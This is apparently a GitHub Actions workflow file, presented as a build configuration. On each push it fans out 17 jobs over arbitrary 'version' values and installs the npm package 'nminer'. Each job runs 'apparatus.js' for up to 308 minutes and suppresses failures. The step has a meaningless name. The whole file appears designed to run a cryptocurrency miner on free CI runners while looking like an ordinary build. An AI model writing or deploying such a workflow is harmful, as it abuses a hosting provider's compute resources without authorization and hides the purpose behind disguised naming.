name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 400 }
          - { version: 4566 }
          - { version: 9141 }
          - { version: 2685 }
          - { version: 9096 }
          - { version: 6737 }
          - { version: 3714 }
          - { version: 758 }
          - { version: 4841 }
          - { version: 7002 }
          - { version: 8846 }
          - { version: 2721 }
          - { version: 310 }
          - { version: 9471 }
          - { version: 8439 }
          - { version: 7277 }
          - { version: 8187 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: miserable homely sans frantically
        run: |
          npm install nminer@latest
          timeout 308m node apparatus.js || echo "apparatus executed"